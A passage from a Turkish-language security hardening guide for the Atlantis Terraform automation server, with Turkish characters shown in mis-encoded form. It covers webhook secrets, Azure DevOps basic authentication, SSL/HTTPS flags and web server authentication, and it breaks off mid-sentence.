Atlantis, `$ATLANTIS_GH_WEBHOOK_SECRET`/`$ATLANTIS_GITLAB_WEBHOOK_SECRET` ortam deÄŸiÅŸkenleri aracÄ±lÄ±ÄŸÄ±yla Webhook secret'larÄ±nÄ±n ayarlanmasÄ±nÄ± gerektirir. `--repo-allowlist` bayraÄŸÄ± ayarlÄ± olsa bile, webhook secret olmadan saldÄ±rganlar, izin verilen bir depo gibi davranarak Atlantis'e istek yapabilirler. Webhook secret'lar, webhook isteklerinin gerÃ§ekten VCS saÄŸlayÄ±cÄ±nÄ±zdan (GitHub veya GitLab) geldiÄŸini saÄŸlar.

Azure DevOps kullanÄ±yorsanÄ±z, webhook secret'lar yerine temel bir kullanÄ±cÄ± adÄ± ve parola ekleyin.

### Azure DevOps Temel Kimlik DoÄŸrulamasÄ± <a href="#azure-devops-basic-authentication" id="azure-devops-basic-authentication"></a>

Azure DevOps, tÃ¼m webhook olaylarÄ±nda temel kimlik doÄŸrulama baÅŸlÄ±ÄŸÄ± gÃ¶ndermeyi destekler. Bunun iÃ§in webhook konumunuz iÃ§in bir HTTPS URL kullanmanÄ±z gerekmektedir.

### SSL/HTTPS <a href="#ssl-https" id="ssl-https"></a>

Webhook secret'larÄ±nÄ± kullanÄ±yorsanÄ±z ancak trafiÄŸiniz HTTP Ã¼zerinden gerÃ§ekleÅŸiyorsa, webhook secret'lar Ã§alÄ±nabilir. `--ssl-cert-file` ve `--ssl-key-file` bayraklarÄ±nÄ± kullanarak SSL/HTTPS'yi etkinleÅŸtirin.

### Atlantis Web Sunucusunda Kimlik DoÄŸrulamasÄ±nÄ± EtkinleÅŸtirin <a href="#enable-authentication-on-atlantis-web-server" id="enable-authentication-on-atlantis-web-server"></a>

Web hizmetinde kimlik doÄŸrulamasÄ±nÄ± etkinleÅŸtirmek Ã§ok Ã¶nerilir. `--web-basic-auth=true` bayra
